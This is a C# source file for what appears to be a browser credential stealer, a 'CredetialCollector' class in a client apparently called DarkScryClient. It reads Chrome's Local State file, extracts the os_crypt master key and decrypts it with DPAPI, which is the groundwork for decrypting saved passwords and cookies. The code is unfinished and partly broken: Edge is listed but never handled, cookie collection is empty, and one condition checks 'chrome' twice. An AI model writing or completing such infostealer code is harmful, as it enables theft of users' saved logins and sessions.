using System.Text.Json;
using DarkScryClient.Utils;


namespace WebInfoGather
{
	internal class CredetialCollector
	{
		public enum CollectionType
		{
			Passwords = 0,
			Cookies   = 1,
		}
		private static readonly string[] supported_browsers = { "edge", "chrome" };
		public Dictionary<string, object> Gather(CollectionType collectionType)
		{
			Dictionary<string, object> result = new Dictionary<string, object>();
			string homepath = UserUtils.HomePath();
			string local_state_path = "";

			if (collectionType == CollectionType.Passwords)
			{
                foreach (string item in supported_browsers)
                {
                    if (item == "chrome" || item == "chrome")
					{
						if (item == "chrome")
						{
							local_state_path = Path.Combine(homepath, "\\Local\\Google\\Chrome\\User Data\\Local State");
						}
						string local_state_content = File.ReadAllText(local_state_path);
						using JsonDocument doc = JsonDocument.Parse(local_state_content);
						JsonElement root = doc.RootElement;
						string encrypted_key = "";
						if (root.TryGetProperty("os_crypt", out JsonElement osCrypt))
						{
							encrypted_key = osCrypt.GetStringOrDefault("encrypted_key", "");
						}
						string decrypted_key = NativeMthods.CryptographyHelper.DpapiUnprotectBase64Wrapper(
							encrypted_key,
							NativeMthods.CryptographyHelper.CRYPTPROTECT_LOCAL_MACHINE
						);
						result["encrypted_key"] = decrypted_key;
						Console.WriteLine(decrypted_key);
					}
                }
            }
			return result;
		}
	}
}
